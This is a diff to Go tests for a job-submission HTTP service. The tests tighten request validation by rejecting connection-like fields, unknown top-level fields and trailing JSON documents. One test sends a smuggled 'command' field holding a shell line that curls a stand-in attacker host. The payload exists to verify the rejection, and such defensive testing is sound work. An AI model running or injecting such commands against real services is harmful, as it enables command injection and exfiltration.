@@ -747,13 +747,12 @@ func TestPostJobsRejectsInvalidFilterRegex(t *testing.T) {
 	}
 }
 
-func TestPostJobsIgnoresConnectionLikeRequestFields(t *testing.T) {
+func TestPostJobsRejectsConnectionLikeRequestFields(t *testing.T) {
 	t.Parallel()
 
 	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
 	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
-		Runner:      runner,
-		IDGenerator: sequentialIDGenerator("job-000001"),
+		Runner: runner,
 	})
 	t.Cleanup(service.Close)
 
@@ -787,16 +786,99 @@ func TestPostJobsIgnoresConnectionLikeRequestFields(t *testing.T) {
 	t.Cleanup(func() {
 		_ = response.Body.Close()
 	})
-	require.Equal(t, http.StatusAccepted, response.StatusCode)
+	require.Equal(t, http.StatusBadRequest, response.StatusCode)
+
+	var payload struct {
+		Error string `json:"error"`
+	}
+	require.NoError(t, json.NewDecoder(response.Body).Decode(&payload))
+	require.Contains(t, payload.Error, `json: unknown field "verify"`)
 
 	select {
-	case request := <-runner.started:
-		require.Equal(t, utils.FilterConfig{
-			SchemaFilter: "^public$",
-			TableFilter:  utils.DefaultFilterString,
-		}, request.FilterConfig())
-	case <-time.After(2 * time.Second):
-		t.Fatal("expected verify job to start")
+	case <-runner.started:
+		t.Fatal("runner must not start when connection-like request fields are present")
+	default:
+	}
+}
+
+func TestPostJobsRejectsUnknownTopLevelFields(t *testing.T) {
+	t.Parallel()
+
+	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
+	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
+		Runner: runner,
+	})
+	t.Cleanup(service.Close)
+
+	server := httptest.NewServer(service.Handler())
+	t.Cleanup(server.Close)
+
+	response, err := http.Post(
+		server.URL+"/jobs",
+		"application/json",
+		bytes.NewBufferString(`{
+			"filters": {
+				"include": {
+					"schema": "^public$"
+				}
+			},
+			"command": "sh -c 'curl attacker'"
+		}`),
+	)
+	require.NoError(t, err)
+	t.Cleanup(func() {
+		_ = response.Body.Close()
+	})
+
+	require.Equal(t, http.StatusBadRequest, response.StatusCode)
+
+	var payload struct {
+		Error string `json:"error"`
+	}
+	require.NoError(t, json.NewDecoder(response.Body).Decode(&payload))
+	require.Contains(t, payload.Error, `json: unknown field "command"`)
+
+	select {
+	case <-runner.started:
+		t.Fatal("runner must not start when unknown request fields are present")
+	default:
+	}
+}
+
+func TestPostJobsRejectsTrailingJSONDocuments(t *testing.T) {
+	t.Parallel()
+
+	runner := &blockingRunner{started: make(chan verifyservice.RunRequest, 1)}
+	service := verifyservice.NewService(verifyservice.Config{}, verifyservice.Dependencies{
+		Runner: runner,
+	})
+	t.Cleanup(service.Close)
+
+	server := httptest.NewServer(service.Handler())
+	t.Cleanup(server.Close)
+
+	response, err := http.Post(
+		server.URL+"/jobs",
+		"application/json",
+		bytes.NewBufferString(`{}{"filters":{"include":{"schema":"^public$"}}}`),
+	)
+	require.NoError(t, err)
+	t.Cleanup(func() {
+		_ = response.Body.Close()
+	})
+
+	require.Equal(t, http.StatusBadRequest, response.StatusCode)
+
+	var payload struct {
+		Error string `json:"error"`
+	}
+	require.NoError(t, json.NewDecoder(response.Body).Decode(&payload))
+	require.Contains(t, payload.Error, "request body must contain exactly one JSON object")
+
+	select {
+	case <-runner.started:
+		t.Fatal("runner must not start when multiple JSON documents are present")
+	default:
 	}
 }
 
